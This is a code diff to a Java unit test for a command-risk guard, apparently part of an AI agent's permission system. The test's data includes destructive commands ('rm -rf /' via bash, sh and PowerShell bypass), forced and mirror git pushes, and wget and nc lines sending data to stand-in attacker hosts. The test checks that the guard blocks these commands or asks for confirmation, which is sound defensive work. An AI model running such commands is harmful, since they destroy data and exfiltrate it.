@@ -50,12 +50,12 @@ class CommandRiskGuardTest {
         PolicyPermissionGate autoGate = new PolicyPermissionGate(PermissionMode.AUTO);
         PolicyPermissionGate readOnlyGate = new PolicyPermissionGate(PermissionMode.READ_ONLY);
 
-        String[] mustConfirm =
-            {"git push --force origin main", "git push -f origin master", "git push --force-with-lease origin dev",
-                "git push --force-with-lease=origin/release/1.0 origin release/1.0", "git push origin +HEAD:main",
-                "git -C sub push -f origin master", "git push -f", "git push --force origin HEAD",
-                "git push --force --all", "git push --delete origin main", "git push origin :master",
-                "git push --repo=origin --force main", "sh -c \"git push --force origin main\""};
+        String[] mustConfirm = {"git push --force origin main", "git push -f origin master",
+            "git push --force-with-lease origin dev",
+            "git push --force-with-lease=origin/release/1.0 origin release/1.0", "git push origin +HEAD:main",
+            "git -C sub push -f origin master", "git push -f", "git push --force origin HEAD", "git push --force --all",
+            "git push --delete origin main", "git push origin :master", "git push --repo=origin --force main",
+            "git push --mirror origin", "sh -c \"git push --force origin main\""};
         for (String command : mustConfirm) {
             Map<String, Object> args = Map.of("command", command);
             assertTrue(tool.confirm(args), "AUTO 模式必须二次确认: " + command);
@@ -77,6 +77,20 @@ class CommandRiskGuardTest {
             assertEquals(PermissionDecision.ALLOW,
                 autoGate.check(new ToolCall("c3", "run_command", args), tool).decision(), command);
         }
+    }
+
+    @Test
+    void expandsMergedShellFlagsAndDoesNotTreatLocalhostSuffixAsLoopback() {
+        for (String command : new String[] {"bash -ec \"rm -rf /\"", "sh -xc \"rm -rf ~\"",
+            "powershell -ExecutionPolicy Bypass -Command \"rm -rf /\""}) {
+            assertTrue(tool.execute(Map.of("command", command)).startsWith("ERROR: "), command);
+        }
+        assertTrue(tool.confirm(Map.of("command", "wget --post-data=x http://localhost.attacker.example/upload")));
+        assertTrue(tool.confirm(Map.of("command", "wget --post-data=x http://evil.example/?next=localhost")));
+        assertTrue(tool.confirm(Map.of("command", "nc localhost.attacker.example 8080")));
+        assertFalse(tool.confirm(Map.of("command", "wget --post-data=x http://[::1]:8080/upload")));
+        assertFalse(tool.confirm(Map.of("command", "wget --post-data=x http://127.0.0.1:8080/upload")));
+        assertFalse(tool.confirm(Map.of("command", "nc 127.0.0.1 8080")));
     }
 
     @Test
